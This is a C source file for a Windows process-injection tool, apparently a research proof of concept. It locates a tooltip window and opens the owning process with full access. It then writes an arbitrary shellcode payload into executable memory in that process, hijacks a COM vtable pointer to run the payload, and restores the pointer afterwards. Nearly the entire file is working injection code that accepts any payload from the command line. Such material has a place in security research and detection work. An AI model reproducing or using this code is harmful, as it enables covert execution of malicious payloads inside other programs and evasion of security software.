/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"
  
typedef struct _IUnknown_VFT {
    // IUnknown
    LPVOID QueryInterface;
    LPVOID AddRef;
    LPVOID Release;
    
    // CToolTipsMgr
    LPVOID ptrs[128];
} IUnknown_VFT;

VOID commctrl_inject(LPVOID payload, DWORD payloadSize) {
    HWND         hw = 0;
    SIZE_T       rd, wr;
    LPVOID       ds, cs, p, ptr;
    HANDLE       hp;
    DWORD        pid;
    IUnknown_VFT unk;
    
    // 1. find a tool tip window.
    //    read index zero of window bytes
    hw = FindWindow(L"tooltips_class32", NULL);
    p  = (LPVOID)GetWindowLongPtr(hw, 0);
    GetWindowThreadProcessId(hw, &pid);
    
    // 2. open the process and read CToolTipsMgr
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &rd);
    ReadProcessMemory(hp, ptr, &unk, sizeof(unk), &rd);
    
    //printf("HWND : %p Heap : %p PID : %i vftable : %p\n", 
      // hw, p, pid, ptr);
    
    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. allocate RW memory and write new CToolTipsMgr
    unk.AddRef = cs;
    ds = VirtualAllocEx(hp, NULL, sizeof(unk),
      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hp, ds, &unk, sizeof(unk), &wr);
    
    // 5. update pointer, trigger execution
    WriteProcessMemory(hp, p, &ds, sizeof(ULONG_PTR), &wr);
    PostMessage(hw, WM_USER, 0, 0);

    // sleep for moment
    Sleep(1);
    
    // 6. restore original pointer and cleanup
    WriteProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &wr);    
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}

// WorkerA or WorkerW created by SHCreateWorkerWindowW
BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res, pid;
    HANDLE                   hp;
    LPVOID                   ds;
    SIZE_T                   rd;
    BOOL                     bClass = FALSE;
    
    if(ptr == NULL) return FALSE;
    
    GetWindowThreadProcessId(hwnd, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return FALSE;
    
    // read first value of pointer
    ReadProcessMemory(hp, ptr, &ds, sizeof(ULONG_PTR), &rd);
    
    // query the pointer
    res = VirtualQueryEx(hp, ds, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;
    
    bClass = ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_IMAGE     ) && 
              (mbi.Protect == PAGE_READONLY));
            
    CloseHandle(hp);    
    return bClass;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    WCHAR    cls[MAX_PATH];
    PWCHAR   filter = (PWCHAR)lParam;
    LPVOID   cs;
    DWORD    pid;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // filter specified?
    if(filter != NULL) {
      // does class match our filter? skip printing if not
      if(StrStrI(cls, filter) == NULL) goto L1;
    }
    cs = (LPVOID)GetWindowLongPtr(hwnd, 0);
    GetWindowThreadProcessId(hwnd, &pid);
    
    if(IsClassPtr(hwnd, cs)) {
      printf("%16p %16p %-40ws %-5i %ws\n", 
          hwnd, cs, cls, pid, wnd2proc(hwnd));
    }
    
L1:
    EnumChildWindows(hwnd, EnumWindowsProc, lParam);
    
    return TRUE;
}

VOID commctrl_list(PWCHAR filter) {
    printf("%-16s %-16s %-40s %-5s %s\n", 
      "HWND", "WindowBytes", "Class", "PID", "Process");
    printf("*******************************************"
    "***************************************************\n");
      
    EnumWindows(EnumWindowsProc, (LPARAM)filter);
}
    
int main(void) {
    int     argc;
    WCHAR   **argv;
    LPVOID  pic;
    DWORD   len;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    // inject payload into process via tooltips_class32 control
    if(argc != 2) {
      printf("usage: tooltip_inject <payload.bin>\n");
      return 0;
    }
    
    // inject payload?
    len = readpic(argv[1], &pic);
    if(len != 0) {
      commctrl_inject(pic, len);
    } else {
      printf("unable to read from %ws\n", argv[1]);
      commctrl_list(argv[1]);
    }
    return 0;
}
